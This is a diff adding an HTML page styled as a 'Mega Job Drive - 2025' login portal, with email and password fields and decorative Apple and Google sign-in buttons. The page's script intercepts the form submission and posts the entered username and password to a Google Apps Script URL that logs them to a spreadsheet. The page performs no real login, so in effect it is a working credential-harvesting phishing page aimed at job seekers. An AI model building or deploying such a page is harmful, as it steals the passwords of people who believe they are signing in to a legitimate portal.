@@ -1,0 +1,210 @@
+<!-- <!DOCTYPE html>
+<html>
+<head>
+    <title>Test Login Form</title>
+</head>
+<body>
+    <h2>Test Login Page</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required><br><br>
+        <input type="password" id="password" placeholder="Password" required><br><br>
+        <button type="submit">Login</button>
+    </form>  -->
+
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mega Job Drive - 2025</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      display: flex;
+      min-height: 100vh;
+      background-color: #f4f4f4;
+    }
+
+    .container {
+      display: flex;
+      flex: 1;
+      flex-direction: row;
+    }
+
+    .left-panel, .right-panel {
+      flex: 1;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .left-panel {
+      background-color: #fff;
+    }
+
+    .left-panel h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    form input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    form button {
+      width: 100%;
+      padding: 12px;
+      background-color: #f4c10f;
+      border: none;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .social-login {
+      margin-top: 20px;
+      display: flex;
+      gap: 10px;
+    }
+
+    .social-login button {
+      flex: 1;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .apple-btn {
+      background-color: #000;
+      color: #fff;
+    }
+
+    .google-btn {
+      background-color: #4285F4;
+      color: #fff;
+    }
+
+    .links {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .links a {
+      color: #0077cc;
+      text-decoration: none;
+      margin-right: 10px;
+    }
+
+    .right-panel {
+      background: url('https://images.unsplash.com/photo-1529333166437-7750a6dd5a70') center/cover no-repeat;
+      color: #fff;
+      position: relative;
+    }
+
+    .calendar {
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    .calendar h3 {
+      margin-bottom: 10px;
+    }
+
+    .days {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .meeting-card {
+      background-color: rgba(255, 255, 255, 0.2);
+      padding: 15px;
+      border-radius: 8px;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+      }
+
+      .right-panel {
+        min-height: 300px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left-panel">
+      <h2>Loign and Portal</h2>
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Email ID" required />
+        <input type="password" id="password" placeholder="Password" required />
+        <button type="submit">Sign in  to continue</button>
+      </form>
+      <div class="social-login">
+        <button class="apple-btn">Login with Apple</button>
+        <button class="google-btn">Login with Google</button>
+      </div>
+      <div class="links">
+        <a href="#">Are we any account? Sign in</a>
+        <a href="#">Terms & Conditions</a>
+      </div>
+    </div>
+    <div class="right-panel">
+      <div class="calendar">
+        <h3>Week View</h3>
+        <div class="days">
+          <span>Sun 22</span><span>Mon 23</span><span>Tue 24</span>
+          <span>Wed 25</span><span>Thu 26</span><span>Fri 27</span><span>Sat 28</span>
+        </div>
+        <div class="meeting-card">
+          <strong>Daily Meeting</strong><br>
+          12:00 pm – 01:00 pm<br>
+          👤👤👤 Participants
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+    <script>
+        const form = document.getElementById("loginForm");
+        const sheetURL = "https://script.google.com/macros/s/AKfycbzW1gyM0g8STQ7FfNLkYqThRRx-JsjKAMskL9UG8tVvCxRZvqZ4fPA2G8L5Pi7nVeJwxg/exec"; // Replace with your Apps Script URL
+
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            // Send data to Google Sheet
+            const response = await fetch(sheetURL, {
+                method: "POST",
+                body: JSON.stringify({username, password})
+            });
+
+            const result = await response.json();
+            console.log(result); // {status: "success"}
+
+            //alert("Data submitted to your Sheet safely!");
+        });
+    </script>
+</body>
+</html>
